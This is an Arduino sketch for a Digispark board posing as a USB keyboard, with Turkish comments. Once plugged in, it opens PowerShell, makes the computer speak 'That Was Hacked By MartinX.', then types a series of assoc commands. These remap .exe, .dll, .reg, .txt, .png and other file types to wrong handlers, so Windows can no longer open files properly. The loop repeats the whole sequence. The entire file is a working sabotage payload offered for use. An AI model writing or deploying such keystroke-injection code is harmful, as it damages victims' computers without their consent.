#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  //Setup cods:

}

void loop() {
  
  //Dosya Yapısı Bozma
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Add-Type -AssemblyName System.speech");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.print("$speak.Speak(\"That Was Hacked By MartinX.\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  //birinci kod
  DigiKeyboard.print("assoc .mp3=txtfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //ikinci kod
  DigiKeyboard.print("assoc .xml=pngfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //ucuncu kod
  DigiKeyboard.print("assoc .png=txtfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //dorduncu kod
  DigiKeyboard.print("assoc .dll=txtfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //besinci kod
  DigiKeyboard.print("assoc .exe=pngfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //altinci kod
  DigiKeyboard.print("assoc .vbs=Visual Style");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //yedinci kod
  DigiKeyboard.print("assoc .reg=xmlfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //sekizinci kod
  DigiKeyboard.print("assoc .txt=regfile");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}
